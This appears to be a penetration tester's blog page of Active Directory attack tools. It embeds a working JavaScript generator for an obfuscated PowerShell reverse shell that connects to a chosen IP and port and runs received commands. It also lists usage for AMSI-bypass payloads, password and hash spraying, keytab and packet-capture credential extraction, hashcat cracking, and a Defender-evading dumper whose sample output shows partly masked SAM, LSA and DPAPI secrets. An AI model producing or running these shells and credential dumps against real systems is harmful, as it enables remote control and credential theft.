---
# the default layout is 'page'
icon: fas fa-tools
order: 5
---
# AD Mindmap 
[Repo Link](https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap_ad_dark_classic_2025.03.excalidraw.svg)

# Powershell Payload Gen
<div class="container">
    <div class="row">
        <div class="col-md-6">
            <form>
                <div class="form-group">
                    <label for="ip">IP Address</label>
                    <input type="text" class="form-control" id="ip" placeholder="191.168.x.x" />
                </div>
                <div class="form-group">
                    <label for="port">Port</label>
                    <input type="text" class="form-control" id="port" placeholder="9001" />
                </div>
                <button type="button" class="btn btn-primary mt-2" onclick="generateCode()">Generate</button>
            </form>
        </div>
    </div>
    <div class="row mt-4" id="outputContainer" style="display: none;">
        <div class="col-12">
            <div id="output" class="p-3 bg-dark text-white rounded" style="white-space: pre-wrap; font-family: monospace;"></div>
        </div>
    </div>
</div>

<script>
    function getRandomVariable() {
        const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        let varName = '';
        for (let i = 0; i < Math.floor(Math.random() * 5) + 5; i++) {
            varName += chars[Math.floor(Math.random() * chars.length)];
        }
        return varName;
    }

    function generateByteArray(variableName) {
        return `[byte[]]$${variableName} = New-Object byte[] 65535;`;
    }

    function generateCode() {
        const ip = document.getElementById("ip").value;
        const port = document.getElementById("port").value;

        if (!ip || !port) {
            alert("Please enter both IP and port");
            return;
        }

        const varClient = getRandomVariable();
        const varStream = getRandomVariable();
        const varBytes = getRandomVariable();
        const varData = getRandomVariable();
        const varSendback = getRandomVariable();
        const varSendback2 = getRandomVariable();
        const varSendbyte = getRandomVariable();
        const varI = getRandomVariable();
        const varEncoding = Math.random() < 0.5 ? "ASCII" : "UTF8";
        const flushMethod = Math.random() < 0.5 ? "$stream.Flush();" : "[System.Threading.Thread]::Sleep(100);";

        const byteArrayInit = generateByteArray(varBytes);

        const powershellTemplate = `
$${varClient}=New-Object System.Net.Sockets.TCPClient("${ip}",${port});$${varStream}=$${varClient}.GetStream();${byteArrayInit}while(($${varI}=$${varStream}.Read($${varBytes},0,$${varBytes}.Length)) -ne 0){$${varData}=(New-Object -TypeName System.Text.${varEncoding}Encoding).GetString($${varBytes},0,$${varI});$${varSendback}=try{iex $${varData} 2>&1 | Out-String}catch{\$_};$${varSendback2}=$${varSendback}+"[>] ";$${varSendbyte}=([text.encoding]::${varEncoding}).GetBytes($${varSendback2});$${varStream}.Write($${varSendbyte},0,$${varSendbyte}.Length);${flushMethod}};$${varClient}.Close();
        `.replace(/\s+/g, ' ').replace(/\s?;\s?/g, ';').replace(/\s?{\s?/g, '{').trim();

        document.getElementById("output").innerText = powershellTemplate;
        document.getElementById('outputContainer').style.display = 'block';
    }
</script>


## 🛠 Powershell Payload Generator Tool 
- Always Generate unique Random words in payload.
- AMSI Bypass.
- Fast & Efficient

Repo link:- [link](https://github.com/0xmrsecurity/All_Fast/blob/main/Generate-Payload/windows/Sl0t.sh)
### Usage:-
```bash
./Slot.sh --lhost 192.168.x.x --lport 9001 --sport 8000
```
## 🌐 IOXIDResolver
- Resolve all IP Address of the Machine.(Ipv4 and IPv6 Both)
- Resolve all interface Adress.
- Also Resolve the hostname

Repo link:- [link](https://github.com/mubix/IOXIDResolver/blob/main/IOXIDResolver.py)
### Usage:-
```bash
python3 IOXIDResolver.py -t  192.168.xx.xx
```

## 🥅 NetSpray
- Spray Passwords and Hash in all Protocals.

Repo link:- [link](https://github.com/0xmrsecurity/NetExec-Stuff)
### Usage:-
```bash
NetSpray <protocols|all> <targets> -u <username> [-p <password> | -H <hash>]
```
## 🌐 username-anarchy  &&  🌐 GenUser_list.sh
- Generating variation of usernames.

Repo link:- [username-anarchy](https://github.com/urbanadventurer/username-anarchy)
### Usage:-
```bash
./username-anarchy -i users.txt  > valid-user.lst 
```
Repo link:- [GenUser_list](https://github.com/0xmrsecurity/All_Fast/blob/main/Generate-Userlist/GenUser_list.sh)
### Usage:-
```bash
./GenUser_list.sh -h 
*****************************************
*           GenUser_list.sh             *
*****************************************
Usage: ./GenUser_list.sh -i input_user.lst
```

## 🌐 KeyTabExtract
- Extract creds from keytab file.
- For Example Below

Repo link:- [KeyTabExtract](https://github.com/sosdave/KeyTabExtract/blob/master/keytabextract.py)
### Usage:-
```bash
python3 KeyTabExtract.py /path/to/krb5.keytab
```
```bash
└─# python3 KeyTabExtract.py /home/0xmr/krb5.keytab 
[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
        REALM : AI.LOC
        SERVICE PRINCIPAL : UUCP$/
        NTLM HASH : fa1a60293357xxxxxe99b306e406537
        AES-256 HASH : 6de7510ba5a852dc1dea141a8bda6xxxxxx25db6d04a133713feaddbbc19f6ba8
        AES-128 HASH : 5dde7468f96xxxxxfb326cb09ac28ee0
```
## 🌐 trufflehog
- Find .git File leaks.

Repo link:- [trufflehog](https://github.com/trufflesecurity/trufflehog)
### Usage:-
```bash
trufflehog file://$(pwd)   #It scan the current Directory for Git leaks....
```
## 🌐 PCredz
- PCredz is a tool written in python that can extract clear-text credentials such as credit card numbers, POP, SMTP, FTP, Kerberos AS-REQ hashes from a network packet capture or a live interface.

Repo link:- [PCredz](https://github.com/lgandx/PCredz)
### Usage:-
```bash
# Extract Secrets
./pcredz -f file.pcap
hashcat -m 5600 NTLMv2.txt /usr/share/wordlist/rockyou.txt

# Focus on cleartext credentials only
./Pcredz -f capture.pcap --disable NTLM --disable Kerberos

./pcredz -i eth0 -v      # Capture live Interface
```
## 🚈 silph.exe
- This tool will able to bypass and Dump all secrets like Sam hashes,lsa and dcc2 Hashes.
- Non Detectable by Defender.

Repo link:- sliph.exe
### Usage:-
```bash
PS C:\Users\Administrator\Desktop> ./silph.exe -dcc2 -lsa -sam

███████╗██╗██╗     ██████╗ ██╗  ██╗
██╔════╝██║██║     ██╔══██╗██║  ██║
███████╗██║██║     ██████╔╝███████║
╚════██║██║██║     ██╔═══╝ ██╔══██║
███████║██║███████╗██║     ██║  ██║
╚══════╝╚═╝╚══════╝╚═╝     ╚═╝  ╚═╝
    Stealthy In-Memory Password Harvester

  "Well… I think I wanted to be like Eris."
[*] Dumping local SAM hashes
Name: Administrator
RID: 500
NT: 2dfe3378335xxxxxx764e581b856a662a

Name: DefaultAccount
RID: 503
NT: <empty>

Name: WDAGUtilityAccount
RID: 504
NT: 58f8e0214xxxxxxbc2c5f82fb7cb47ca1
Name: tyler
RID: 1008
NT: 1fceba8xxxxxxxxx15fb40e29c86b01f6

Name: sshd
RID: 1009
NT: f450335b6xxxxxxxxx1d44aa53bafb591

[*] Dumping LSA Secrets
[*] DPAPI_SYSTEM
dpapi_machinekey: 0x0e88ce11d311dxxxxx22ac2708a4d707e00be
dpapi_userkey: 0x8b68be9ef724xxxxxxxxx3559e10078e36e8ab32
[*] NL$KM
NL$KM: 0x8dd28e6754cxxxxxxx953b95b46a2b366
```

## 🐒 Ipcloud & ip2provider
- Both tool help us to find the vendor Ip, where it's is hosted like aws,gcp,azure or etc...

Rep0 link:-[ip2cloud Github](https://github.com/devanshbatham/ip2cloud)
### Usage:-
```bash
echo $IP | ip2cloud
```
Repo link:-[ip2provider Github](https://github.com/oldrho/ip2provider)
### Usage:-
```bash
./ip2provider.py $IP
```
